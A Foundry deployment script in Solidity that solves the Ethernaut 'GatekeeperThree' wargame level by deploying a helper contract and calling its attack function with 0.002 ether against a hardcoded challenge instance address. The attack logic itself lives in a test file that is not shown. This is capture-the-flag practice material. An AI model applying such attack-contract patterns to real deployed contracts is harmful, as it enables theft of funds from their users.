// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../../lib/forge-std/src/Script.sol";
import {GatekeeperThree} from "../../src/Ethernaut/GatekeeperThree.sol";
import {Helper} from "../../test/Ethernaut/GatekeeperThree.t.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        Helper helper = new Helper();
        GatekeeperThree gatekeeperThree = GatekeeperThree(
            payable(0xdcab3251AE7e3642dcE0627F4B41dA5b45942B92)
        );
        helper.attack{value: 0.002 ether}(gatekeeperThree);
        vm.stopBroadcast();
    }
}
